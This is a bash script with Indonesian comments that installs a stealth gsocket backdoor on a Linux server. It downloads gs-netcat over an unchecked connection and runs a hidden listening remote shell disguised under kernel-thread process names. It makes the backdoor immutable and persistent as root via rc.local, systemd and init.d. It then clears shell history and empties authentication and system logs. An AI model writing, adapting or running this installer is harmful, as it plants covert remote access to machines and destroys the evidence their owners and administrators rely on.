#!/bin/bash
# ============================================================
# GSOCKET STEALTH INSTALLER (FINAL FIXED VERSION)
# Binary Location: /usr/lib/systemd/gsocket_bin
# Secret Key: [VPS_IP]@dark-ai
# Connection: gs-netcat -s [VPS_IP]@dark-ai -i
# ============================================================

# ============================================================
# 0. SETUP VARIABLES (FIXED)
# ============================================================
HIDDEN_DIR="/usr/lib/systemd"
BINARY_NAME="gsocket_bin"
DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"

# Daftar nama proses SISTEM (TANPA / DAN TANPA SPASI)
PROCESS_NAMES=(
    "irqbalance"    # IRQ balancer
    "kswapd0"       # Kernel swap daemon
    "kthreadd"      # Kernel thread daemon
    "ksoftirqd0"    # Kernel soft IRQ
    "migration0"    # CPU migration
    "watchdog0"     # Kernel watchdog
    "cpuhp0"        # CPU hotplug
    "kdevtmpfs"     # Device tmpfs
    "khungtaskd"    # Hung task detector
    "oom_reaper"    # OOM reaper
    "writeback"     # FS writeback
    "kcompactd0"    # Memory compaction
    "ksmd"         # Kernel samepage merging
    "upowerd"      # Power management
    "accountsdaemon" # User account tracking
)

# Ambil IP VPS
VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
DAEMON_SECRET="${VPS_IP}@dark-ai"

# ============================================================
# 1. DOWNLOAD BINARY (FIXED)
# ============================================================
echo "=========================================="
echo " GSOCKET STEALTH INSTALLER - FINAL FIXED"
echo "=========================================="

mkdir -p "$HIDDEN_DIR" 2>/dev/null
chmod 755 "$HIDDEN_DIR" 2>/dev/null

if [ ! -f "$DAEMON_PATH" ]; then
    echo "[*] Mengunduh binary..."
    curl -sL --insecure --max-time 10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
    wget -q --no-check-certificate --timeout=10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null

    if [ -f "$DAEMON_PATH" ]; then
        chmod +x "$DAEMON_PATH"
        echo "[+] Binary terunduh"
    else
        echo "[!] Gagal mengunduh. Membuat fallback..."
        cat > "$DAEMON_PATH" << 'FALLBACKEOF'
#!/bin/bash
exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
FALLBACKEOF
        chmod +x "$DAEMON_PATH"
    fi
else
    echo "[*] Binary sudah ada"
fi

# Lindungi binary
chattr +i "$DAEMON_PATH" 2>/dev/null

# ============================================================
# 2. BUAT WRAPPER (FIXED - NO SLASH)
# ============================================================
WRAPPER_DIR="/usr/local/bin"  # Gunakan /usr/local/bin untuk menghindari konflik
mkdir -p "$WRAPPER_DIR" 2>/dev/null

for PROCESS in "${PROCESS_NAMES[@]}"; do
    WRAPPER_PATH="$WRAPPER_DIR/$PROCESS"

    # Jangan overwrite file asli yang penting
    if [ ! -f "$WRAPPER_PATH" ] || [ ! -x "$WRAPPER_PATH" ]; then
        cat > "$WRAPPER_PATH" << WRAPPEREOF
#!/bin/bash
exec -a "\$0" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
WRAPPEREOF
        chmod +x "$WRAPPER_PATH" 2>/dev/null
        chattr +i "$WRAPPER_PATH" 2>/dev/null
    fi
done

# ============================================================
# 3. JALANKAN GSOCKET (FIXED)
# ============================================================
echo "[*] Mengaktifkan layanan..."
pkill -f "$BINARY_NAME" 2>/dev/null

# Pilih nama proses acak
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"

# Jalankan dengan wrapper
nohup "$WRAPPER_DIR/$PROCESS_NAME" >/dev/null 2>&1 &

sleep 2
if pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
    echo "[+] Layanan berjalan sebagai: $PROCESS_NAME"
else
    echo "[!] Mengaktifkan fallback..."
    nohup "$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" >/dev/null 2>&1 &
fi

# ============================================================
# 4. PERSISTENCE (FIXED)
# ============================================================
echo "[*] Mengkonfigurasi persisten..."

# --- Metode 1: rc.local ---
if [ -f /etc/rc.local ]; then
    if ! grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null; then
        sed -i "/^exit 0/i\n\"$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}\" &" /etc/rc.local 2>/dev/null
    fi
fi

# --- Metode 2: systemd ---
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/gsocket.service << 'SYSTEMEOF'
[Unit]
Description=GSocket Service
After=network.target

[Service]
Type=simple
ExecStart=$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}
Restart=always
RestartSec=5
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SYSTEMEOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable gsocket >/dev/null 2>&1
    systemctl start gsocket >/dev/null 2>&1
fi

# --- Metode 3: init.d ---
cat > /etc/init.d/gsocket << INIT_EOF
#!/bin/bash
# GSocket Service
### BEGIN INIT INFO
# Provides:          gsocket
# Required-Start:    \$network \$remote_fs \$syslog
# Required-Stop:     \$network \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description:  GSocket Service
### END INIT INFO

case "\$1" in
    start)
        "$WRAPPER_DIR/${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "$BINARY_NAME" >/dev/null 2>&1
        ;;
    restart)
        \$0 stop
        sleep 1
        \$0 start
        ;;
    *)
        echo "Usage: /etc/init.d/gsocket {start|stop|restart}"
        exit 1
        ;;
esac
exit 0
INIT_EOF
chmod +x /etc/init.d/gsocket
update-rc.d gsocket defaults >/dev/null 2>&1 || chkconfig gsocket on >/dev/null 2>&1

# ============================================================
# 5. HAPUS JEJAK
# ============================================================
echo "[*] Membersihkan jejak..."
history -c 2>/dev/null
rm -f /root/.bash_history 2>/dev/null
unset HISTFILE 2>/dev/null

for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/syslog /var/log/wtmp /var/log/lastlog /var/log/btmp; do
    if [ -f "$logfile" ]; then
        echo -n > "$logfile" 2>/dev/null
    fi
done

rm -rf /tmp/.gsocket* /tmp/install* /tmp/setup* 2>/dev/null
rm -rf /var/tmp/.gsocket* /var/tmp/install* /var/tmp/setup* 2>/dev/null

# ============================================================
# 6. TAMPILKAN CARA KONEKSI
# ============================================================
echo ""
echo "=========================================="
echo "[✅] INSTALASI SELESAI"
echo "=========================================="
echo ""
echo "🔐 SECRET KEY: $DAEMON_SECRET"
echo "🌐 VPS IP: $VPS_IP"
echo ""
echo "📌 CARA KONEKSI:"
echo "-----------------"
echo "1. Unduh GSocket Client di mesin lokal:"
echo "   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
echo "   chmod +x gs-netcat"
echo ""
echo "2. Koneksi ke server:"
echo "   ./gs-netcat -s $VPS_IP@dark-ai -i"
echo ""
echo "3. Alternatif (jika port 443 terbuka):"
echo "   nc $VPS_IP 443"
echo "   socat - TCP:$VPS_IP:443"
echo ""
echo "🔍 VERIFIKASI:"
echo "-----------------"
echo "Cek proses: ps aux | grep -E '$(echo "${PROCESS_NAMES[@]}" | tr ' ' '|')'"
echo "   (Proses akan terlihat sebagai nama sistem asli)"
echo "Cek service: systemctl status gsocket"
echo "Cek port:    ss -tulnp | grep 443"
echo ""
echo "⚠️  PERINGATAN:"
echo "-----------------"
echo "Proses akan terlihat sebagai: $(echo "${PROCESS_NAMES[@]}" | tr ' ' ', ')"
echo "Argumen disembunyikan sepenuhnya."
echo "Simpan secret key dan IP VPS dengan aman!"
echo "=========================================="
